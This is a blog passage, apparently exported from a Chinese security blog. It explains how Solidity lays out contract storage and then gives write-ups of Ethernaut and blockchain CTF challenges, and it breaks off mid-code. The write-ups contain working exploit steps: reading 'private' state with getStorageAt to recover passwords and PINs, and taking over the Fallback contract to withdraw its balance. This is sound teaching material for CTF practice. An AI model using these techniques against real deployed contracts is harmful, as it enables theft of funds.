<h2 id="变长数组"><a href="#变长数组" class="headerlink" title="变长数组"></a>变长数组</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    uint[] a=[<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0x99</span>];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        a.push(<span class="number">0x66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707175504159.png" alt="image-20210707175504159"></p>
<p><img src="/2021/07/09/19/image-20210707175512656.png" alt="image-20210707175512656"></p>
<p>根据<a href="https://ropsten.etherscan.io/tx/0xf15acc653de386bc58eb1b9d83ad4afb6b6cf0f57560786076d4d86579b77c1f#statechange">交易查询</a>到的存储在以太坊虚拟机上面的值，下面进行分析</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000003</span> slot0</span><br><span class="line"><span class="comment">//存储的是数组a的长度3</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000077</span> slotx</span><br><span class="line"><span class="comment">//a[0]</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000088</span> slot(x+<span class="number">1</span>)</span><br><span class="line"><span class="comment">//a[1]</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000099</span> slot(x+<span class="number">2</span>)</span><br><span class="line"><span class="comment">//a[2]</span></span><br></pre></td></tr></table></figure>
<p>Storage Address的由来   x=keccak_256(slot) slot是指数组长度存储的位置，此处对应的就是0，对应的值就是</p>
<blockquote>
<p>0x0000000000000000000000000000000000000000000000000000000000000000</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i) <span class="comment">#计算时需要进行填充</span></span><br><span class="line"></span><br><span class="line">a=sha3.keccak_256(byte32(<span class="number">0</span>)).hexdigest()</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment">#0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 x</span></span><br></pre></td></tr></table></figure>
<p>此后a[1],a[2]对应偏移1，2个插槽</p>
<p>然后我们在调用add()函数看，发生了什么</p>
<p><img src="/2021/07/09/19/image-20210707182204458.png" alt="image-20210707182204458"></p>
<p>第一步改变了数组a的长度</p>
<p>第二步在a[2]后面的一个插槽写入0x66</p>
<h1 id="0x06-字符串类型"><a href="#0x06-字符串类型" class="headerlink" title="0x06 字符串类型"></a>0x06 字符串类型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line"></span><br><span class="line">    string a=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707204019929.png" alt="image-20210707204019929"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b=<span class="number">0x77686f616d69</span></span><br><span class="line">print(long_to_bytes(b))</span><br><span class="line"><span class="comment">#b&#x27;whoami&#x27;</span></span><br><span class="line"><span class="comment">#0xc代表字符串长度 每个字母占2个十六进制位</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line"></span><br><span class="line">    string a=<span class="string">&#x27;先知社区&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707204158617.png" alt="image-20210707204158617"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b=<span class="number">0xe58588e79fa5e7a4bee58cba</span></span><br><span class="line">print(long_to_bytes(b).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#先知社区</span></span><br><span class="line"><span class="comment">#0x18 每个汉字占6个十六进制位</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line"></span><br><span class="line">    string a=<span class="string">&#x27;Genius only means hard-working all one\&#x27;s life.&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707205948395.png" alt="image-20210707205948395"></p>
<p>此时的存储方式和数组类似</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b=<span class="number">0x47656e697573206f6e6c79206d65616e7320686172642d776f726b696e6720616c6c206f6e652773206c6966652e</span></span><br><span class="line">print(long_to_bytes(b))</span><br><span class="line"><span class="comment">#b&quot;Genius only means hard-working all one&#x27;s life.&quot;</span></span><br></pre></td></tr></table></figure>
<p>思考了一下，比如像下面这样写，调用add函数后会发生什么</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    string a=<span class="string">&#x27;abcdf&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        a=<span class="string">&#x27;Genius only means hard-working all one\&#x27;s life.&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707210511744.png" alt="image-20210707210511744"></p>
<p><img src="/2021/07/09/19/image-20210707210522311.png" alt="image-20210707210522311"></p>
<h1 id="0x07-结构体类型"><a href="#0x07-结构体类型" class="headerlink" title="0x07 结构体类型"></a>0x07 结构体类型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    struct test&#123;</span><br><span class="line">        bool a;</span><br><span class="line">        uint8 b;</span><br><span class="line">        uint c;</span><br><span class="line">        string d;</span><br><span class="line">    &#125;</span><br><span class="line">    test student=test(<span class="literal">true</span>,<span class="number">0x01</span>,<span class="number">0xff</span>,<span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707223419898.png" alt="image-20210707223419898"></p>
<p>依旧按照存储优化原则</p>
<ul>
<li>a，b slot0</li>
<li>c        slot1</li>
<li>d        slot2</li>
</ul>
<p>如果d超出了32字节，那么此时x=keccak_256(2)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    struct test&#123;</span><br><span class="line">        bool a;</span><br><span class="line">        uint8 b;</span><br><span class="line">        uint c;</span><br><span class="line">        string d;</span><br><span class="line">    &#125;</span><br><span class="line">    test[] student;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        student.push(test(<span class="literal">true</span>,<span class="number">0x01</span>,<span class="number">0xff</span>,<span class="string">&#x27;abcd&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707225522239.png" alt="image-20210707225522239"></p>
<p><img src="/2021/07/09/19/image-20210707225547430.png" alt="image-20210707225547430"></p>
<p>和变长数组存储类似，只不过以结构体长度为一个存储周期改变</p>
<h1 id="0x08-映射类型"><a href="#0x08-映射类型" class="headerlink" title="0x08 映射类型"></a>0x08 映射类型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span>=&gt;</span>uint) blance;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        blance[<span class="number">0xbc6581e11c216B17aDf5192E209a7F95a49e6837</span>]=<span class="number">0x01</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707230541895.png" alt="image-20210707230541895"></p>
<p>计算的规则是这样的，x=keccak_256(key+slot)</p>
<ul>
<li>key代表映射类型的关键字</li>
<li>slot代表定义映射类型变量对应的插槽</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">key=<span class="number">0xbc6581e11c216B17aDf5192E209a7F95a49e6837</span></span><br><span class="line">b=byte32(key)+byte32(<span class="number">0</span>)</span><br><span class="line">a=sha3.keccak_256(b).hexdigest()</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment">#21d25f73dd60df1532a052f5f1044cb0f7986a3f609d8674628447c29af248fb</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">uint8</span>=&gt;</span>string) blance;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        blance[<span class="number">0xb</span>]=<span class="string">&quot;Genius only means hard-working all one&#x27;s life.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210708222534789.png" alt="image-20210708222534789"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">key=<span class="number">0xb</span></span><br><span class="line">b=byte32(key)+byte32(<span class="number">0</span>)</span><br><span class="line">a=sha3.keccak_256(b).hexdigest()</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment">#9115655cbcdb654012cf1b2f7e5dbf11c9ef14e152a19d5f8ea75a329092d5a6 slot</span></span><br><span class="line">a=sha3.keccak_256(byte32(slot)).hexdigest()</span><br><span class="line"><span class="comment">#3f6f2497fb590e494002b67c712e1fba86767d2906fb8e1ddae48d2b7d91908b</span></span><br></pre></td></tr></table></figure>
<h1 id="0x09-综合练习"><a href="#0x09-综合练习" class="headerlink" title="0x09 综合练习"></a>0x09 综合练习</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract StorageExample6 &#123;</span><br><span class="line">    uint256 a = <span class="number">11</span>;</span><br><span class="line">    uint8 b = <span class="number">12</span>;</span><br><span class="line">    uint128 c = <span class="number">13</span>;</span><br><span class="line">    bool d = <span class="literal">true</span>;</span><br><span class="line">    uint128 e =  <span class="number">14</span>;</span><br><span class="line">    uint256[] public array =  [<span class="number">401</span>,<span class="number">402</span>,<span class="number">403</span>,<span class="number">405</span>,<span class="number">406</span>];</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> UserInfo) public users;</span><br><span class="line">    string  str=<span class="string">&quot;name value&quot;</span>;</span><br><span class="line"></span><br><span class="line">    struct UserInfo &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint8 age;</span><br><span class="line">        uint8 weight;</span><br><span class="line">        uint256[] orders;</span><br><span class="line">        uint64[<span class="number">3</span>] lastLogins;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="title">constructor</span>(<span class="params"></span>)<span class="title">public</span> &#123;</span><br><span class="line">       owner=msg.sender;</span><br><span class="line"></span><br><span class="line">       addUser(owner,<span class="string">&quot;admin&quot;</span>,<span class="number">17</span>,<span class="number">120</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params">address user,string memory name,uint8 age,uint8 weight</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">       <span class="built_in">require</span>(age&gt;<span class="number">0</span> &amp;&amp; age &lt;<span class="number">100</span> ,<span class="string">&quot;bad age&quot;</span>);</span><br><span class="line"></span><br><span class="line">       uint256[] memory orders;</span><br><span class="line">       uint64[<span class="number">3</span>] memory logins;</span><br><span class="line"></span><br><span class="line">       users[user] = UserInfo(&#123;</span><br><span class="line">           name: name, <span class="attr">age</span>:    age,  <span class="attr">weight</span>:weight,</span><br><span class="line">           orders:orders,  <span class="attr">lastLogins</span>:logins</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">addLog</span>(<span class="params">address user,uint64 id1,uint64 id2,uint64 id3</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">       UserInfo storage u = users[user];</span><br><span class="line">       assert(u.age&gt;<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       u.lastLogins[<span class="number">0</span>]=id1;</span><br><span class="line">       u.lastLogins[<span class="number">1</span>]=id2;</span><br><span class="line">       u.lastLogins[<span class="number">2</span>]=id3;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">addOrder</span>(<span class="params">address user,uint256 orderID</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">       UserInfo storage u = users[user];</span><br><span class="line">       assert(u.age&gt;<span class="number">0</span>);</span><br><span class="line">       u.orders.push(orderID);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">getLogins</span>(<span class="params">address user</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint64,uint64,uint64</span>)</span>&#123;</span><br><span class="line">        UserInfo storage u = users[user];</span><br><span class="line">       <span class="keyword">return</span>  (u.lastLogins[<span class="number">0</span>],u.lastLogins[<span class="number">1</span>],u.lastLogins[<span class="number">2</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">getOrders</span>(<span class="params">address user</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256[] memory</span>)</span>&#123;</span><br><span class="line">        UserInfo storage u = users[user];</span><br><span class="line">       <span class="keyword">return</span>  u.orders;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>避免太过冗长，放个图</p>
<p><img src="/2021/07/09/19/image-20210708223819206.png" alt></p>
<h1 id="0x10-解题练习"><a href="#0x10-解题练习" class="headerlink" title="0x10 解题练习"></a>0x10 解题练习</h1><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">web3.eth.get<span class="constructor">StorageAt(<span class="params">address</span>, <span class="params">position</span> [, <span class="params">defaultBlock</span>] [, <span class="params">callback</span>])</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>address</code>：String - 要读取的地址</li>
<li><code>position</code>：Number - 存储中的索引编号</li>
<li><code>defaultBlock</code>：Number|String - 可选，使用该参数覆盖 web3.eth.defaultBlock 属性值</li>
<li><code>callback</code>：Function - 可选的回调函数, 其第一个参数为错误对象，第二个参数为结果。</li>
</ul>
<p>举两个简单的题目</p>
<h2 id="题目一-—Vault"><a href="#题目一-—Vault" class="headerlink" title="题目一 —Vault"></a><a href="https://ethernaut.openzeppelin.com/">题目一</a> —Vault</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义为私有变量只能组织其他合约访问，但是无法阻止公开访问</p>
<p>按照其代码，可以知道password的存储位置是1</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">web3</span><span class="selector-class">.eth</span><span class="selector-class">.getStorageAt</span>(<span class="selector-tag">contract</span><span class="selector-class">.address</span>, 1)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210617154923739.png" alt="image-20210617154923739"></p>
<p><img src="/2021/07/09/19/image-20210617155309438.png" alt="image-20210617155309438"></p>
<p>直接使用</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">contract.unlock(<span class="string">&quot;A very strong secret password :\)&quot;</span>)<span class="regexp">//</span>密码错误</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">contract</span>.unlock(web<span class="number">3</span>.utils.hexToBytes(&#x27;<span class="number">0</span>x<span class="number">412076657279207374726</span>f<span class="number">6</span>e<span class="number">67207365637265742070617373776</span>f<span class="number">7264203</span>a<span class="number">29</span>&#x27;))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210617161012697.png" alt="image-20210617161012697"></p>
<h2 id="题目二-—Lock-Box"><a href="#题目二-—Lock-Box" class="headerlink" title="题目二 —Lock Box"></a><a href="https://blockchainctf.securityinnovation.com/#/">题目二</a> —Lock Box</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity <span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../CtfFramework.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract Lockbox1 is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private pin;</span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address _ctfLauncher, address _player</span>) <span class="title">public</span> <span class="title">payable</span></span><br><span class="line">        <span class="title">CtfFramework</span>(<span class="params">_ctfLauncher, _player</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pin = now%<span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">uint256 _pin</span>) <span class="title">external</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(pin == _pin, <span class="string">&quot;Incorrect PIN&quot;</span>);</span><br><span class="line">        msg.sender.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读取私有变量</li>
<li>constructor只在构造的时候执行一次</li>
</ul>
<p><img src="/2021/07/09/19/image-20210708230008949.png" alt="image-20210708230008949"></p>
<p><img src="/2021/07/09/19/image-20210708230028957.png" alt="image-20210708230028957"></p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethernaut wp</title>
    <url>/2021/06/17/16/</url>
    <content><![CDATA[<h1 id="Ethernaut-wp"><a href="#Ethernaut-wp" class="headerlink" title="Ethernaut wp"></a>Ethernaut wp</h1><p>刷区块链题目的<a href="https://ethernaut.openzeppelin.com/">平台</a>，正好学习一下</p>
<p><a href="https://chrome.google.com/webstore/search/metamask?hl=zh-CN">METAMASK</a></p>
<p><a href="https://remix.ethereum.org/">remix</a></p>
<h2 id="0x01-Hello-Ethernaut"><a href="#0x01-Hello-Ethernaut" class="headerlink" title="0x01 Hello Ethernaut"></a>0x01 Hello Ethernaut</h2><p>上面的插件下好之后注册一个账户，确认链接之后切换到Rinkey测试网络</p>
<p>按照题目提示一步步做就是了</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">contract.info()</span><br><span class="line"><span class="comment">// &quot;You will find what you need in info1().&quot;</span></span><br><span class="line">contract.info1()</span><br><span class="line"><span class="comment">// &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span></span><br><span class="line">contract.info2(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;The property infoNum holds the number of the next info method to call.&quot;</span></span><br><span class="line">contract.infoNum()</span><br><span class="line"><span class="comment">// 42</span></span><br><span class="line">contract.info42()</span><br><span class="line"><span class="comment">// &quot;theMethodName is the name of the next method.&quot;</span></span><br><span class="line">contract.theMethodName()</span><br><span class="line"><span class="comment">// &quot;The method name is method7123949.&quot;</span></span><br><span class="line">contract.method7123949()</span><br><span class="line"><span class="comment">// &quot;If you know the password, submit it to authenticate().&quot;</span></span><br><span class="line">contract.password()</span><br><span class="line"><span class="comment">// &quot;ethernaut0&quot;</span></span><br><span class="line">contract.authenticate(<span class="string">&#x27;ethernaut0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617044622032.png" alt="image-20210617044622032"></p>
<h2 id="0x02-Fallback"><a href="#0x02-Fallback" class="headerlink" title="0x02 Fallback"></a>0x02 Fallback</h2><p>考察知识点，函数调用，不是重入漏洞</p>
<ol>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;   <span class="comment">//使用安全函数</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;  <span class="comment">//地址贡献值映射</span></span><br><span class="line">  address payable public owner;    <span class="comment">//定义合约拥有者</span></span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;     <span class="comment">//初始化</span></span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;    <span class="comment">//定义函数修改器验证是否是拥有者</span></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;  <span class="comment">//收钱函数</span></span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;    <span class="comment">//返回贡献值函数</span></span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;   <span class="comment">//退钱函数</span></span><br><span class="line">    owner.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;    <span class="comment">//改变拥有者函数</span></span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>多转钱，就能使合约拥有者变成自己</li>
<li>调用fallback函数，绕过验证后也能变成自己，fallback函数在调用Transfer函数的时候会调用</li>
<li>调用withdraw函数，账户清零</li>
</ol>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value:<span class="number">1</span>&#125;)  <span class="regexp">//</span>要求<span class="number">1</span></span><br><span class="line"><span class="regexp">//</span>保证在执行FallBack函数时，能通过contributions[msg.sender] &gt; <span class="number">0</span>的校验</span><br><span class="line">contract.sendTransaction(&#123;value:<span class="number">1</span>&#125;) 或者 用MetaMask的发送功能。<span class="regexp">//</span>要求<span class="number">1</span></span><br><span class="line"><span class="regexp">//</span>通过转账调用Fallback函数。</span><br><span class="line">contract.withdraw() <span class="regexp">//</span>要求<span class="number">2</span></span><br><span class="line"><span class="regexp">//</span>转走合约的钱。</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617045950026.png" alt="image-20210617045950026"></p>
<h2 id="0x03-Fallout"><a href="#0x03-Fallout" class="headerlink" title="0x03 Fallout"></a>0x03 Fallout</h2><p>使合约拥有者变成自己</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        <span class="built_in">require</span>(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address payable allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span 